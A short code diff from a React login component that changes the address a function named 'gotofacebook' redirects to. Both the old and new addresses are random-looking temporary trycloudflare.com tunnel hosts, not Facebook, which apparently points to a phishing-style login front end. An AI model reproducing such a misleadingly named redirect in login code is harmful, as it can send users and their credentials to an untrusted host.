@@ -16,7 +16,7 @@ const Login = () => {
   }
 
   const gotofacebook = () => {
-    window.location.href = 'https://lift-fuzzy-fixes-whereas.trycloudflare.com';
+    window.location.href = 'https://week-lat-together-brown.trycloudflare.com';
   }
 
   const handleLogin = async (e) => {
